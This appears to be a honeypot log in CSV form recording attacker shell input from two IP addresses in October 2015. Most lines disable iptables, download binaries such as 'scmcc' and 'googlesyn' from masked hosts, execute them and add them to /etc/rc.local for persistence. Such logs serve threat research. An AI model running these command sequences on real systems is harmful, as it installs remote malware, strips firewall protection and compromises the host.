ip,timestamp,input
"222.186.34.75","2015-10-30 20:51:14","./Control &"
"222.186.34.75","2015-10-30 20:53:23","service iptavles stop"
"222.186.34.75","2015-10-30 20:53:27","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 20:53:31","chmod +x Control"
"222.186.34.75","2015-10-30 20:53:35","./Control &"
"222.186.34.75","2015-10-30 21:25:51","free -m"
"222.186.34.75","2015-10-30 21:43:12","service iptavles stop"
"222.186.34.75","2015-10-30 21:43:16","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 21:43:20","chmod +x Control"
"222.186.34.75","2015-10-30 21:43:24","./Control &"
"222.186.34.75","2015-10-30 21:53:57","service iptavles stop"
"222.186.34.75","2015-10-30 21:54:01","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 21:54:05","chmod +x Control"
"222.186.34.75","2015-10-30 21:54:09","./Control &"
"222.186.34.75","2015-10-30 21:58:50","free -m"
"222.186.34.75","2015-10-30 21:59:16","free -m"
"222.186.34.75","2015-10-30 22:01:10","free -m"
"222.186.34.75","2015-10-30 22:13:28","free -m"
"222.186.34.75","2015-10-30 22:54:18","service iptavles stop"
"222.186.34.75","2015-10-30 22:54:22","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 22:54:26","chmod +x Control"
"222.186.34.75","2015-10-30 22:54:30","./Control &"
"222.186.34.75","2015-10-30 23:09:42","service iptavles stop"
"222.186.34.75","2015-10-30 23:09:46","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 23:09:50","chmod +x Control"
"222.186.34.75","2015-10-30 23:09:54","./Control &"
"222.186.34.75","2015-10-30 23:11:34","free -m"
"222.186.34.75","2015-10-30 23:45:02","service iptavles stop"
"222.186.34.75","2015-10-30 23:45:06","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 23:45:10","chmod +x Control"
"222.186.34.75","2015-10-30 23:45:14","./Control &"
"222.186.34.75","2015-10-30 23:57:08","service iptavles stop"
"222.186.34.75","2015-10-30 23:57:12","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 23:57:16","chmod +x Control"
"222.186.34.75","2015-10-30 23:57:20","./Control &"
"222.186.34.75","2015-10-31 01:07:39","free -m"
"59.46.10.155","2015-10-31 01:58:44","service iptables stop"
"59.46.10.155","2015-10-31 01:59:01","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-31 01:59:01","service iptables stop"
"59.46.10.155","2015-10-31 01:59:05","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-31 01:59:09","chmod 0755 /tmp/scmcc"
"59.46.10.155","2015-10-31 01:59:13","nohup /tmp/scmcc > /dev/null 2>&1 &"
"59.46.10.155","2015-10-31 01:59:17","chmod 777 scmcc"
"59.46.10.155","2015-10-31 01:59:20","chmod u+x scmcc"
"59.46.10.155","2015-10-31 01:59:21","./scmcc"
"59.46.10.155","2015-10-31 01:59:24","./scmcc &"
"59.46.10.155","2015-10-31 01:59:25","chmod 0755 /tmp/scmcc"
"59.46.10.155","2015-10-31 01:59:28","chmod u+x scmcc"
"59.46.10.155","2015-10-31 01:59:29","nohup /tmp/scmcc &gt"
"59.46.10.155","2015-10-31 01:59:29","/dev/null 2&gt"
"59.46.10.155","2015-10-31 01:59:29","&amp"
"59.46.10.155","2015-10-31 01:59:29","1 &amp"
"59.46.10.155","2015-10-31 01:59:32","./scmcc &"
"59.46.10.155","2015-10-31 01:59:33","chmod 0777 scmcc"
"59.46.10.155","2015-10-31 01:59:36","cd /tmp"
"59.46.10.155","2015-10-31 01:59:37","chmod u+x scmcc"
"59.46.10.155","2015-10-31 01:59:40","service iptables stop"
"59.46.10.155","2015-10-31 01:59:41","./scmcc &"
"59.46.10.155","2015-10-31 01:59:44","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-31 01:59:45","chmod u+x scmcc"
"59.46.10.155","2015-10-31 01:59:49","./scmcc &"
"59.46.10.155","2015-10-31 01:59:53","cd /tmp"
"59.46.10.155","2015-10-31 01:59:57","service iptables stop"
"59.46.10.155","2015-10-31 02:00:00","./164"
"59.46.10.155","2015-10-31 02:00:01","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-31 02:00:04","chmod 0755 /tmp/scmcc"
"59.46.10.155","2015-10-31 02:00:08","nohup /tmp/scmcc &gt"
"59.46.10.155","2015-10-31 02:00:09","/dev/null 2&gt"
"59.46.10.155","2015-10-31 02:00:09","&amp"
"59.46.10.155","2015-10-31 02:00:09","1 &amp"
"59.46.10.155","2015-10-31 02:00:12","chmod 0777 scmcc"
"59.46.10.155","2015-10-31 02:00:13","chmod 777 scmcc"
"59.46.10.155","2015-10-31 02:00:16","chmod u+x scmcc"
"59.46.10.155","2015-10-31 02:00:17","./164"
"59.46.10.155","2015-10-31 02:00:20","./scmcc &"
"59.46.10.155","2015-10-31 02:00:21","chmod 0755 /tmp/scmcc"
"59.46.10.155","2015-10-31 02:00:24","chmod u+x dos6cc4"
"59.46.10.155","2015-10-31 02:00:25","nohup /tmp/scmcc &gt"
"59.46.10.155","2015-10-31 02:00:26","/dev/null 2&gt"
"59.46.10.155","2015-10-31 02:00:26","&amp"
"59.46.10.155","2015-10-31 02:00:26","1 &amp"
"59.46.10.155","2015-10-31 02:00:28","./scmcc &"
"59.46.10.155","2015-10-31 02:00:29","chmod 0777 scmcc"
"59.46.10.155","2015-10-31 02:00:32","cd /tmp"
"59.46.10.155","2015-10-31 02:00:33","chmod u+x scmcc"
"59.46.10.155","2015-10-31 02:00:36","echo \"cd  /tmp/\">>/etc/rc.local"
"59.46.10.155","2015-10-31 02:00:37","./scmcc &"
"59.46.10.155","2015-10-31 02:00:40","echo \"./scmcc&\">>/etc/rc.local"
"59.46.10.155","2015-10-31 02:00:41","chmod u+x dos6cc4"
"59.46.10.155","2015-10-31 02:00:44","echo \"./scmcc&\">>/etc/rc.local"
"59.46.10.155","2015-10-31 02:00:45","./scmcc &"
"59.46.10.155","2015-10-31 02:00:48","echo \"/etc/init.d/iptables stop\">>/etc/rc.local"
"59.46.10.155","2015-10-31 02:00:49","cd /tmp"
"59.46.10.155","2015-10-31 02:00:53","echo \"cd  /tmp/\">>/etc/rc.local"
"59.46.10.155","2015-10-31 02:00:57","echo \"./scmcc&\">>/etc/rc.local"
"59.46.10.155","2015-10-31 02:01:01","echo \"./scmcc&\">>/etc/rc.local"
"59.46.10.155","2015-10-31 02:01:05","echo \"/etc/init.d/iptables stop\">>/etc/rc.local"
"222.186.34.75","2015-10-31 02:12:52","service iptavles stop"
"222.186.34.75","2015-10-31 02:12:56","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-31 02:13:00","chmod +x Control"
"222.186.34.75","2015-10-31 02:13:04","./Control &"
"222.186.34.75","2015-10-31 02:14:32","service iptavles stop"
"222.186.34.75","2015-10-31 02:14:36","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-31 02:14:40","chmod +x Control"
"222.186.34.75","2015-10-31 02:14:44","./Control &"
"222.186.34.75","2015-10-31 09:16:48","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 09:16:51","cd /tmp"
"222.186.34.75","2015-10-31 09:17:21","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 09:17:21","./googlesyn"
"222.186.34.75","2015-10-31 09:17:21","exit"
"222.186.34.75","2015-10-31 09:17:22","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 09:17:25","cd /tmp"
"222.186.34.75","2015-10-31 09:17:29","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 09:17:33","./googleudp"
"222.186.34.75","2015-10-31 09:17:37","exit"
"222.186.34.75","2015-10-31 09:25:31","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 09:25:34","cd /tmp"
"222.186.34.75","2015-10-31 09:26:03","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 09:26:04","./googleudp"
"222.186.34.75","2015-10-31 09:26:04","exit"
"222.186.34.75","2015-10-31 09:26:04","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 09:26:07","cd /tmp"
"222.186.34.75","2015-10-31 09:26:12","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 09:26:15","./googlesyn"
"222.186.34.75","2015-10-31 09:26:19","exit"
"222.186.34.75","2015-10-31 09:32:49","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 09:33:05","cd /tmp"
"222.186.34.75","2015-10-31 09:33:05","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 09:33:05","./googleudp"
"222.186.34.75","2015-10-31 09:33:05","exit"
"222.186.34.75","2015-10-31 09:33:05","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 09:33:09","cd /tmp"
"222.186.34.75","2015-10-31 09:33:13","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 09:33:17","./googlesyn"
"222.186.34.75","2015-10-31 09:33:21","exit"
"222.186.34.75","2015-10-31 10:14:56","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 10:15:22","cd /tmp"
"222.186.34.75","2015-10-31 10:15:22","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 10:15:22","./googleudp"
"222.186.34.75","2015-10-31 10:15:23","exit"
"222.186.34.75","2015-10-31 10:15:23","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 10:15:26","cd /tmp"
"222.186.34.75","2015-10-31 10:15:30","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 10:15:34","./googlesyn"
"222.186.34.75","2015-10-31 10:15:38","exit"
"222.186.34.75","2015-10-31 10:16:08","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 10:16:12","cd /tmp"
"222.186.34.75","2015-10-31 10:16:44","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 10:16:44","./googleudp"
"222.186.34.75","2015-10-31 10:16:44","exit"
"222.186.34.75","2015-10-31 10:36:52","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 10:36:56","cd /tmp"
"222.186.34.75","2015-10-31 10:37:00","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 10:37:04","./googleudp"
"222.186.34.75","2015-10-31 10:37:08","exit"
"222.186.34.75","2015-10-31 10:43:36","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 10:43:50","cd /tmp"
"222.186.34.75","2015-10-31 10:43:50","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 10:43:50","./googleudp"
"222.186.34.75","2015-10-31 10:43:50","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 10:43:52","exit"
"222.186.34.75","2015-10-31 10:44:07","cd /tmp"
"222.186.34.75","2015-10-31 10:44:07","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 10:44:07","./googlesyn"
"222.186.34.75","2015-10-31 10:44:07","exit"
"222.186.34.75","2015-10-31 10:44:08","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 10:44:11","cd /tmp"
"222.186.34.75","2015-10-31 10:44:15","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 10:44:19","./googlesyn"
"222.186.34.75","2015-10-31 10:44:23","exit"
"222.186.34.75","2015-10-31 10:46:46","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 10:46:50","cd /tmp"
"222.186.34.75","2015-10-31 10:47:21","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 10:47:21","./googleudp"
"222.186.34.75","2015-10-31 10:47:21","exit"
"222.186.34.75","2015-10-31 10:47:54","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 10:47:57","cd /tmp"
"222.186.34.75","2015-10-31 10:48:01","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 10:48:05","./googlesyn"
"222.186.34.75","2015-10-31 10:48:09","exit"
"222.186.34.75","2015-10-31 10:54:53","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 10:54:57","cd /tmp"
"222.186.34.75","2015-10-31 10:55:01","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 10:55:05","./googleudp"
"222.186.34.75","2015-10-31 10:55:09","exit"
"222.186.34.75","2015-10-31 10:57:10","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 10:57:27","cd /tmp"
"222.186.34.75","2015-10-31 10:57:27","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 10:57:27","./googlesyn"
"222.186.34.75","2015-10-31 10:57:28","exit"
"222.186.34.75","2015-10-31 10:57:28","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 10:57:31","cd /tmp"
"222.186.34.75","2015-10-31 10:57:35","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 10:57:39","./googleudp"
"222.186.34.75","2015-10-31 10:57:43","exit"
"222.186.34.75","2015-10-31 10:59:45","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 10:59:49","cd /tmp"
"222.186.34.75","2015-10-31 10:59:53","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 10:59:57","./googlesyn"
"222.186.34.75","2015-10-31 11:00:01","exit"
"222.186.34.75","2015-10-31 11:38:16","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 11:38:20","cd /tmp"
"222.186.34.75","2015-10-31 11:38:24","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 11:38:28","./googlesyn"
"222.186.34.75","2015-10-31 11:38:32","exit"
"222.186.34.75","2015-10-31 11:44:04","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 11:44:08","cd /tmp"
"222.186.34.75","2015-10-31 11:44:12","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 11:44:16","./googlesyn"
"222.186.34.75","2015-10-31 11:44:20","exit"
"222.186.34.75","2015-10-31 11:46:14","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 11:46:18","cd /tmp"
"222.186.34.75","2015-10-31 11:46:22","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 11:46:26","./googleudp"
"222.186.34.75","2015-10-31 11:46:30","exit"
"222.186.34.75","2015-10-31 11:57:50","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 11:57:54","cd /tmp"
"222.186.34.75","2015-10-31 11:57:58","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 11:58:02","./googlesyn"
"222.186.34.75","2015-10-31 11:58:06","exit"
"222.186.34.75","2015-10-31 12:59:10","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-31 12:59:14","cd /tmp"
"222.186.34.75","2015-10-31 12:59:32","chmod 777 ./googleudp"
"222.186.34.75","2015-10-31 12:59:32","./googleudp"
"222.186.34.75","2015-10-31 12:59:32","exit"
"222.186.34.75","2015-10-31 12:59:33","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 12:59:36","cd /tmp"
"222.186.34.75","2015-10-31 12:59:40","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 12:59:44","./googlesyn"
"222.186.34.75","2015-10-31 12:59:48","exit"
"222.186.34.75","2015-10-31 13:12:32","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-31 13:12:36","cd /tmp"
"222.186.34.75","2015-10-31 13:12:40","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-31 13:12:44","./googlesyn"
